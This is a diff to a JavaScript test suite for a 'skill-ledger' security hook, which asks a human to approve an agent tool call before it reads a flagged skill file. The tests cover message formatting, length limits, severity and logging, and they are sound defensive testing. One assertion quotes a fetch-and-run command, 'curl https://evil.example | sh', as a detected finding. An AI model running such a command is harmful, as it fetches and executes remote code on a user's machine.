@@ -366,7 +366,7 @@ describe("skill-ledger", () => {
     assert.equal(await beforeToolCall.handler(readSkillEvent(), { runId: "run-1" }), undefined);
   });
 
-  for (const status of ["none", "drifted", "deny", "tampered"]) {
+  for (const status of ["none", "warn", "drifted", "deny", "tampered"]) {
     it(`${status} asks for approval by default`, async () => {
       mockSkillLedgerStatus(status);
       const { beforeToolCall } = registerHandlers();
@@ -377,12 +377,48 @@ describe("skill-ledger", () => {
       );
 
       assert.equal(result?.requireApproval?.title, "Skill Ledger Security Check");
-      assert.match(result?.requireApproval?.description, new RegExp(status));
+      assert.equal(
+        result?.requireApproval?.description,
+        `[skill-ledger][${status}] Skill: ${status}; summary message for ${status}\nDetails: logs.`,
+      );
       assert.equal(
         result?.requireApproval?.severity,
         status === "deny" || status === "tampered" ? "critical" : "warning",
       );
     });
+  }
+
+  for (const status of ["none", "warn", "drifted", "deny", "tampered"]) {
+    for (const scenario of ["long summary", "long name", "both"]) {
+      it(`bounds ${status} approval with ${scenario} and preserves the full log`, async () => {
+        const skillName = scenario === "long summary" ? "risky" : "risky-" + "名".repeat(300);
+        const summary = "danger.sh: curl-risk; " +
+          (scenario === "long name" ? "review required" : "risk detail ".repeat(50));
+        mockSkillLedgerCheck({
+          exitCode: 0,
+          stdout: JSON.stringify({ latestStatus: status, message: summary }),
+          stderr: "",
+        });
+        const { beforeToolCall, logs } = registerHandlers();
+        const event = readSkillEvent(`/skills/${skillName}/SKILL.md`);
+
+        const result = await beforeToolCall.handler(event, {});
+
+        const description = result?.requireApproval?.description;
+        assert.equal(typeof description, "string");
+        assert.ok(description.length <= 256, `description length: ${description.length}`);
+        const nameExcerpt = scenario === "long summary" ? skillName : "risky-" + "名".repeat(41) + "…";
+        assert.ok(description.startsWith(`[skill-ledger][${status}] Skill: ${nameExcerpt}; `));
+        assert.match(description, /danger\.sh: curl-risk/);
+        assert.ok(description.endsWith("\nDetails: logs."));
+        assert.equal(result.requireApproval.title, "Skill Ledger Security Check");
+        assert.equal(result.requireApproval.severity,
+          status === "deny" || status === "tampered" ? "critical" : "warning");
+        assert.ok(logs.includes(`[WARN] [skill-ledger] ⚠️ Skill '${skillName}': ${summary}`));
+        assert.deepEqual(lastCheckArgs?.slice(2), ["skill-ledger", "show", `/skills/${skillName}`]);
+        assert.deepEqual(event, readSkillEvent(`/skills/${skillName}/SKILL.md`));
+      });
+    }
   }
 
   it("includes finding summary in deny approval while keeping critical severity", async () => {
@@ -398,7 +434,7 @@ describe("skill-ledger", () => {
       }),
       stderr: "",
     });
-    const { beforeToolCall } = registerHandlers();
+    const { beforeToolCall, logs } = registerHandlers();
 
     const result = await beforeToolCall.handler(
       readSkillEvent("/skills/deny/SKILL.md"),
@@ -408,7 +444,9 @@ describe("skill-ledger", () => {
     assert.equal(result?.requireApproval?.title, "Skill Ledger Security Check");
     assert.match(result?.requireApproval?.description, /danger\.sh/);
     assert.match(result?.requireApproval?.description, /curl https:\/\/evil\.example \| sh/);
-    assert.match(result?.requireApproval?.description, /rollback --version v000001/);
+    assert.ok(result?.requireApproval?.description.length <= 256);
+    assert.ok(logs.some((log) => log.includes(message)));
+    assert.ok(logs.some((log) => log.includes("rollback --version v000001")));
     assert.equal(result?.requireApproval?.severity, "critical");
   });
 
